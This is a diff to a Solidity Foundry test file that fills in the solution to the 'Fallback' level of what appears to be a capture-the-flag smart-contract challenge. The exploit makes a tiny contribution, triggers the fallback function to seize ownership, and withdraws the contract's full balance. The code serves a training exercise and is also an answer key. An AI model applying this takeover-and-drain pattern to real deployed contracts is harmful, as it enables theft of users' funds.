@@ -60,9 +60,34 @@ contract FallbackTest is Test {
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        /**
-         * YOUR CODE GOES HERE
-         */
+        //Triggering contribute function with value greater than 0
+        fallbackContract.contribute{value: 1}();
+        emit log_named_uint(
+            "Attackers's contribution: ",
+            fallbackContract.getContribution()
+        );
+
+        // Triggering the fallback function - we need to send a transaction to the contract without indicating a method. We are going to use global function call
+        (bool success, ) = address(fallbackContract).call{value: 1}("");
+        require(success, "call failed");
+
+        emit log_named_address(
+            "New owner of the contract: ",
+            fallbackContract.owner()
+        );
+
+        emit log_named_uint(
+            "Balance of the contract before withdrawal: ",
+            address(fallbackContract).balance
+        );
+
+        // Withdrawing contract balance
+        fallbackContract.withdraw();
+
+        emit log_named_uint(
+            "Balance of the contract after withdrawal: ",
+            address(fallbackContract).balance
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
